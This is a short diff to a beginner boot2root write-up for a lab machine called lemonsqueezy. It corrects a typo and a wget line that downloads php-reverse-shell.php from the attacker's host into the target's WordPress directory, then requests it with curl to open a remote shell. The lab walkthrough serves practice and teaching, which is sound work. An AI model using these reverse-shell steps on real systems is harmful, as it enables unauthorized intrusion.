@@ -1,4 +1,4 @@
-is is a beginner boot2root in a similar style to ones I personally enjoy like Mr Robot, Lazysysadmin and MERCY.
+This is a beginner boot2root in a similar style to ones I personally enjoy like Mr Robot, Lazysysadmin and MERCY.
 
 This is a VMware machine. DHCP is enabled, add lemonsqueezy to your hosts. It’s easypeasy!
 
@@ -114,7 +114,7 @@ Music can change your life, base64: invalid input
 
 touch > /var/www/html/wordpress/test
 
-wget http://172.16.227.1:8888/php-reverse-shell.php -O /var/www/html/wordpress/php-reverse-shell.phpinfo
+wget http://172.16.227.1:8888/php-reverse-shell.php -O /var/www/html/wordpress/php-reverse-shell.php
 
 
 └─$ curl http://172.16.227.130/wordpress/php-reverse-shell.php
